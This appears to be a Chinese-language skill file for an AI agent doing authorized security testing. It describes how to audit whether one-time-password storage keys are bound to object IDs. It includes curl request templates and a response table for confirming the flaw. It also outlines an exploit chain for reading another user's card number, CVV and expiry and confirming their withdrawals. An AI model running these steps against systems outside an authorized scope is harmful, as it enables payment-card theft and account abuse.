---
name: otp-binding-idor-audit
description: >-
  OTP 验证码绑定模型审计：检查 OTP 的 Redis/后端存储 key 是否绑定了
  业务对象 ID（如 card_id、order_id），未绑定则存在 IDOR。
  用户提到 OTP 绑定、验证码越权、card_sensitive、二次验证 IDOR 时使用。
  来源：cardopay_20260802 实战提炼。
version: 1.0.0
---

# OTP 绑定模型审计

**前提**：目标在 `config/scope*.json`。
**来源**：案卷 `cardopay_20260802` §OTP 绑定模型实战。

---

## 核心问题

OTP 的后端存储 key 决定安全性：

```
安全的 key:    email:action:card_id    → OTP 绑定了具体对象
不安全的 key:  email:action            → OTP 只绑邮箱+动作，不绑对象 → IDOR
```

## 审计流程

### 步骤 1：触发 OTP

```bash
# 发送 OTP 给自己
curl -X POST https://目标/api/send-verification-code \
  -H "Authorization: Bearer <token>" \
  -d '{"action":"view_card"}'
# → 成功，OTP 发到邮箱/手机
```

### 步骤 2：用自己的 OTP + 他人对象 ID

```bash
# 关键测试：OTP 是自己的，card_id 是他人的
curl -X POST https://目标/api/v2/card/sensitive \
  -d '{"card_id":"他人的card_id", "verification_code":"123456"}'
```

### 步骤 3：响应分析

| 响应 | 含义 | 结论 |
|------|------|------|
| `验证码不存在` | key 里有 card_id（key=email:action:他人card → 查不到） | ✅ 安全 |
| `验证码错误` | key 里没有 card_id（key=email:action → 找到了但码不对） | ❌ IDOR |
| `验证码正确` + 返回他人数据 | 完全没绑定 | ❌ 确认 IDOR |
| `card_id 不属于你` | 应用层有额外检查 | ✅ 安全 |

## 常见 OTP 存储模型

| 模型 | Redis Key | 安全？ |
|------|-----------|--------|
| `user:action` | `otp:john@test.com:view_card` | ⚠️ 不绑对象 |
| `user:action:object` | `otp:john@test.com:view_card:card_123` | ✅ |
| `session:action` | `otp:sess_abc:view_card` | ⚠️ 不绑对象 |
| `global:code` | `otp:123456` | ❌ 最危险 |

## 高危场景

- 查看银行卡完整信息（卡号/CVV/有效期）
- 查看交易详情
- 修改密码（OTP 不绑 user_id → 改他人密码）
- 提现确认（OTP 不绑 withdraw_id → 确认他人提现）

## 组合攻击

```
OTP IDOR + BOLA = 完整利用链：
1. BOLA: POST /card/trades {card_id: "他人"} → 读到交易记录
2. OTP IDOR: 发 OTP 给自己 → 用自己的 OTP + 他人 card_id
3. → 读到他人卡的完整三要素（卡号+CVV+有效期）
```

## 跨 action 测试

```bash
# 用 action=register 的 OTP 试 action=card_sensitive
# 如果 key 没有 action → 跨动作复用
curl -X POST https://目标/api/v2/card/sensitive \
  -d '{"verification_code":"注册时的OTP"}'
```

## 踩坑

- cardopay: OTP key = `email:action`（独立），跨 action 不可复用 ✅
- 但 card_id 未绑定（推断），需要 Gmail OTP 最终确认
- 有些系统 OTP 窗口只有 5 分钟，测试要快
- rate limit 可能限制 OTP 发送次数（每分钟 1 次）
